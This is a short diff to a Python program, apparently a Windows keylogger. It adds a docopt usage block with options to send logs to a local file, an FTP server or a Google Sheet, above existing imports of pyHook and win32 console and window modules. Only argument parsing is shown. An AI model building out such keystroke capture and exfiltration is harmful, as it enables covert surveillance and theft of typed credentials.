@@ -1,3 +1,29 @@
+"""
+Example program.
+
+Usage:
+  logger mode (--local <file> | --ftp <server> | --google <id>)  
+  logger -h | --help
+  logger --version
+
+ Options:
+   -h, --help       Show this message.
+   -l, --local      Log locally, specify path to file where log will be written locally
+   -f, --ftp        Log to FTP server, specify server address
+   -g, --google     Log to google sheet, specify sheet id
+   --version        Print the version.
+"""
+
+from docopt import docopt
+from pprint import pprint
+
+
+
+if __name__ == '__main__':
+    arguments = docopt(__doc__, version='FIXME')
+    pprint(arguments)
+
+
 import pyHook, pythoncom, time, click, win32console, win32gui
 from sys import platform
 
